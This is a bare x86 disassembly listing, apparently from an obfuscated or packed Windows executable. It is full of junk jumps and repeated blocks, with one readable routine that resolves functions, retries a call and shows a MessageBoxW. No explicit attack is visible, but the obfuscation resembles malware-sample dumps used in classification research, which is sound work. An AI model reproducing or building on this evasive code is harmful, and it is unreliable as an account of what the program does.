add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_4027c3
jg r-xdata
push ecx
push edi
call sub_402843
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e963
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f5c
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7287fac
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13af8c
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13f16
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9b01
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100aabd
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40281f
jae r-xdata
push esp
push edx
call sub_402791
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120aa5a
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcaa33
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e963
ja r-xdata
jmp 0xffffffffe7287fac
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f5c
jno r-xdata
jno 0xffffffffff13af8c
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13f16
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9b01
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100aabd
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4029d2
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_4029d2
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_402a0a
jne 0xffffffffa3a5107d
push esi
push esi
pushfd
call sub_4029fb
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ eax - 0x7cffbfd6 ] bl
in al dx
add al 0x77
add eax 0xf0673e9
mov [ ebp + 0x9 ] esi
add edx 0x5e855
add [ eax ] al
mov ecx 0x850fef7f
jmp [ esp + 0xa8 ]
sub_402a0a
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f3092
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864cf31
mov ecx 0x850fef7f
push ebp
call sub_402a2e
jns 0xffffffffc2c13398
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_402a51
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_402a49
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ef1d
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402a82
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x90 ] 0x1
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x80 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x80 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x84 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
cmp [ ebp - 0x80 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x84 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x8c ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov edx [ ebp - 0x8c ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_402c46
retn 0x10
sub_402a49
push ebx
push eax
call sub_402a51
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_402a49
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ef1d
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402a82
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x90 ] 0x1
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x80 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x80 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x84 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
cmp [ ebp - 0x80 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x84 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x8c ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov edx [ ebp - 0x8c ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_402c46
retn 0x10
sub_402a51
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_402a49
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8287db0
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ef1d
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402a82
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x90 ] 0x1
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x80 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x80 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x84 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
cmp [ ebp - 0x80 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x84 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x8c ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov edx [ ebp - 0x8c ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_402c46
retn 0x10
sub_402bbb
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe8469d13
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35a317
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
push ebp
push esp
sub esp 0x8
call sub_402be7
jae 0x5a761a61
or ecx 0x30246c81
mov [ 0xffffffff8300402b ] eax
in al dx
add al 0x73
adc al [ ecx - 0x16fe8c0d ]
push ebx
jmp 0xffffffff8394812e
push edx
push ebp
sub esp 0xc
call sub_402c0c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
fwait
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3296
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x48649873
add al [ ebx + 0x77d04ec ]
sub_402be7
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x48649873
push edx
push ebp
sub esp 0xc
call sub_402c0c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
fwait
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3296
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_402c0c
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc38153
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f3296
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff84001ab4
push ebx
call sub_402c34
jge 0xffffffff844f36a0
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_402c60
jpo 0x592831d6
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aa1b4
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x539180c5
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
test [ eax - 0x1 ] esi
call sub_402c7b
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
fwait
sub al 0x40
add [ ebx + 0x57504ec ] al
push edx
push ebp
sub esp 0xc
call sub_402c0c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402c46
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_402c60
jpo 0x592831d6
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aa1b4
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x539180c5
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
test [ eax - 0x1 ] esi
call sub_402c7b
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_402c0c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
fwait
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3296
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402c60
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x539180c5
pop eax
jae r-xdata
call 0xe3aa1b4
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
test [ eax - 0x1 ] esi
call sub_402c7b
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push edx
push ebp
sub esp 0xc
call sub_402c0c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
fwait
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3296
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402c7b
jae r-xdata
pop edx
jns 0x5b001cfa
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
test [ eax - 0x1 ] esi
jns r-xdata
sub_402cc0
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x58 ] ecx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
call [ lstrlenW@IAT ]
shl eax 0x1
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x5c ] 0x0
push r--data
mov ecx [ ebp - 0x58 ]
mov edx [ ecx + 0x4 ]
call edx
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x58 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x90 ] ecx
push r--data
mov edx [ ebp - 0x68 ]
push edx
call [ ebp - 0x90 ]
mov [ ebp - 0x78 ] eax
mov eax [ ebp - 0x58 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x94 ] ecx
push r--data
mov edx [ ebp - 0x68 ]
push edx
call [ ebp - 0x94 ]
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
cmp [ ebp - 0x64 ] 0x0
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x430
push ecx
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x42c ]
push eax
call [ ebp - 0x78 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x6c ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x74 ]
add edx 0x1
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xa0 ] eax
push r--data
mov ecx [ ebp - 0x68 ]
push ecx
call [ ebp - 0xa0 ]
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
cmp [ ebp - 0x74 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x8c ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
sub_402e00
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
fisubr [ 0xffffffffec830040 ]
adc [ edx + 0xf ] bl
xchg [ esi ] esp
add [ eax ] eax
add bh bh
and eax 0xce8d0f
add [ eax ] al
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c13ecb
jne r-xdata
call sub_402e8b
ja 0x504b292
call 0x529086cb
add esp 0x4
jns r-xdata
mov eax 0xc7819173
ja r-xdata
jge 0x71fc6fd3
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab7ab
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96b202
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16401c45
pop edx
jg r-xdata
jpo 0xf70a768
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0b274
jne r-xdata
jno 0xffffffff834f866f
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jae r-xdata
je 0xffffffff814fd041
jne 0xffffffffeac1379b
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
jns r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46d31
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
